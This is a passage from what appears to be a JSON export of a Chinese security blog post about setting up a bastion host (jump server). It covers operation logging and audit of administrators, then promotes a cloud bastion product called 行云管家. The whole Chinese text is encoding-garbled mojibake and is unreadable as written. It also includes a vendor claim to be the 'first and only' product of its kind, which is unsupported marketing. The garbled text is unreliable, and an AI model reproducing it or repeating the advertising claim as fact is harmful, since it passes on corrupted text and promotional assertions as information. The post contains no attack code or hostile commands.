¡å’æœºäº‹åè¿ç»´å®¡è®¡çš„ç‰¹æ€§ã€‚ç”¨æˆ·åœ¨å ¡å’æœºä¸­æ‰€è¿›è¡Œçš„è¿ç»´æ“ä½œå‡ä¼šä»¥æ—¥å¿—çš„å½¢å¼è®°å½•ä¸‹æ¥ï¼Œç®¡ç†è€…å³é€šè¿‡æ—¥å¿—å¯¹è¿ç»´äººå‘˜çš„è¿ç»´æ“ä½œè¿›è¡Œå®¡è®¡ã€‚ åŸåˆ™7ï¼šå ¡å’æœºçš„æ“ä½œå®¡è®¡å ¡å’æœºçš„æ“ä½œå®¡è®¡åŠŸèƒ½ä¸»è¦å®¡è®¡è¿ç»´äººå‘˜çš„è´¦å·ä½¿ç”¨ï¼ˆç™»å½•ã€èµ„æºè®¿é—®ï¼‰æƒ…å†µã€èµ„æºä½¿ç”¨æƒ…å†µç­‰ã€‚åœ¨å„æœåŠ¡å™¨ä¸»æœºçš„è®¿é—®æ—¥å¿—è®°å½•éƒ½é‡‡ç”¨ç»Ÿä¸€çš„è´¦å·ã€èµ„æºè¿›è¡Œæ ‡è¯†åï¼Œå ¡å’æœºçš„æ“ä½œå®¡è®¡åŠŸèƒ½æ‰èƒ½æ›´å¥½åœ°å¯¹è´¦å·çš„å®Œæ•´ä½¿ç”¨è¿‡ç¨‹è¿›è¡Œè¿½è¸ªã€‚ ä»¥ä¸Šæ˜¯ä¼ä¸šæ­å»ºå ¡å’æœºæ—¶åº”è¯¥æ³¨æ„çš„7ä¸ªåŸåˆ™ï¼Œåªæœ‰åšæŒå¹¶éµå®ˆ7ä¸ªåŸåˆ™æ­å»ºå ¡å’æœºï¼Œä¼ä¸šçš„æ•°æ®å®‰å…¨æ‰èƒ½å¤Ÿå°½å¯èƒ½çš„å¾—åˆ°ä¿è¯ã€‚å¯¹äºåˆ›ä¸šå…¬å¸æˆ–è€…ä¸­å°ä¼ä¸šæ¥è®²ï¼Œæˆæœ¬æ˜¯ä¸å¾—ä¸è€ƒè™‘çš„å¤§é—®é¢˜ï¼Œæ”¾çœ¼çœ‹å¸‚é¢ä¸Šå ¡å’æœºçš„ä¼—å¤šå“ç‰Œï¼Œç›®å‰ä¸»æµå ¡å’æœºåˆ†ä¸ºå¼€æºå ¡å’æœºå’Œå•†ç”¨å ¡å’æœºä¸¤å¤§ç±»ã€‚ä¼ä¸šé€‰æ‹©åˆé€‚çš„å ¡å’æœºæ­å»ºæ—¶ï¼Œéœ€è¦ç»“åˆè‡ªèº«çš„æˆæœ¬é¢„ä¼°å’Œäº§å“çš„æ€§èƒ½ç‰¹ç‚¹ã€‚å¼€æºå ¡å’æœºä½¿ç”¨çµæ´»æ–¹ä¾¿ï¼Œä½†æ˜¯åæœŸçš„è¿ç»´æˆæœ¬é¢‡é«˜ï¼Œéœ€è¦è¯·ä¸“äººè¿›è¡Œè¿ç»´æˆ–è€…æ‰¾åŸå‚å•†è¿›è¡ŒäºŒæ¬¡å¼€å‘ï¼Œæ€»ä½“ä¸‹æ¥å…¶æˆæœ¬ä¸äºšäºç›´æ¥è´­ä¹°ä¸€å°å•†ç”¨å ¡å’æœºï¼Œå¹¶ä¸”å¼€æºå ¡å’æœºåŸå‚å•†æ²¡æœ‰ä»»ä½•è´£ä»»ã€‚ å•†ç”¨å ¡å’æœºåˆ†ä¸ºä¸‰ç§ï¼Œè¿™é‡Œå°±ä¸ç»†è¯´äº†ï¼Œæ¨èå¤§å®¶ä½¿ç”¨äº‘å ¡å’æœºï¼Œå…å®‰è£…å…ç»´æŠ¤ï¼Œè¡Œäº‘ç®¡å®¶äº‘å ¡å’æœºæ˜¯å¸‚é¢ä¸Šé¦–æ¬¾ä¹Ÿæ˜¯å”¯ä¸€ä¸€æ¬¾æ”¯æŒWindows2012/2016ç³»ç»Ÿæ“ä½œæŒ‡ä»¤å®¡è®¡çš„å ¡å’æœºï¼Œå¹¶ä¸”é™¤äº†ç§æœ‰éƒ¨ç½²ç‰ˆå ¡å’æœºï¼Œè¡Œäº‘ç®¡å®¶è¿˜æä¾›æ›´åŠ ä¾¿å®œä¸”åŠŸèƒ½ä¸€æ ·çš„SaaSå½¢æ€å ¡å’æœºï¼Œä¸ºç”¨æˆ·æä¾›4å°äº‘ä¸»æœºæˆ–å±€åŸŸç½‘ä¸»æœºçš„å…è´¹ç®¡ç†é…é¢ã€‚é€šå¸¸æ¥è®²ï¼Œ4å°ä¸»æœºå…è´¹é…é¢å·²ç»èƒ½å¤Ÿæ»¡è¶³åˆ›ä¸šå…¬å¸æˆ–ä¸­å°å‹ä¼ä¸šçš„åŸºæœ¬éœ€è¦ã€‚","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]}]}